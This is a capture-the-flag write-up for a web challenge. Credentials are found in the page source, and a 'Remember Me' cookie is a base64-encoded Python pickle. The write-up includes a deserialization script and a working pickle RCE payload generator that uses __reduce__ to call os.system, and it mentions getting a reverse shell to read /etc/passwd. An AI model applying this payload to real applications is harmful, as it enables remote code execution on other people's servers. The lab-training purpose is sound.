
Challenge Description:
We have noticed some weird actions on our website , we think that our passwd file has been compromised , can you make sure that it is secure

Step 1:
Step 1: When you open the challenge link, you will see a login page. I tried to perform SQL injection, but it didn't work. 

![image](https://github.com/user-attachments/assets/9ad0d611-1c88-4a6c-819f-3f3b47d1b79a)

Step 2:
 I opened the page source and found a username and password.

![image](https://github.com/user-attachments/assets/47456439-1562-4c0a-b120-66badd4f3268)

step 3:
When I logged in, there was nothing useful. I tried various methods like directory fuzzing, but there were no results.

step4:
I noticed there was a "Remember Me" button. When I checked it, a new cookie appeared. After some searching, I found that the cookie is a Pickle serialization.

step 5: 
I tried to deserialize it and decode it as base64, but it appeared as unreadable text.

![image](https://github.com/user-attachments/assets/99a6ae69-8641-46b6-ab96-a843d92f77a7)

step 6:
 I tried using code I found on the internet, but it produced the same unreadable text. After some debugging, I figured out why it was unreadable. I wrote this code to deserialize:

```
import pickle
import base64

# Define the class `usr` (or import it if it's defined elsewhere)
class usr:
    def __init__(self, username, password):
       pass
    def __repr__(self):
        return f"usr(username='{self.username}', password='{self.password}')"
cookie = "yourcookie"

# Decode the base64 encoded string
decoded_cookie = base64.b64decode(cookie)

# Deserialize using pickle
deserialized_data = pickle.loads(decoded_cookie)

print(deserialized_data)
```
the output of this code be like this ```usr(username='test', password='test')```

step 7:
Then I wrote code to create my own serialized cookie. Here’s the code I used:
```
import pickle
import base64
import subprocess
import os

class RCE(object):
    def __reduce__(self):
        cmd = 'Here can put any command you want '
        return os.system, (cmd,)

class usr(object):
    def __init__(self, username, password):
        self.username = username
        self.password = password

if __name__ == '__main__':
    user = usr(username=RCE(), password=RCE())

    pickled = pickle.dumps(user)
    
    encoded = base64.b64encode(pickled)
    print(encoded)
    encoded_urlsafe = base64.urlsafe_b64encode(pickled)
    print(encoded_urlsafe)
```
I then created a reverse shell, generated the cookie, and replaced it with the cookie on the website. After getting the reverse shell, I tried to search for the flag, but I found nothing called flag.txt or anything similar. After rereading the description, I realized I would find it in the /etc/passwd file.
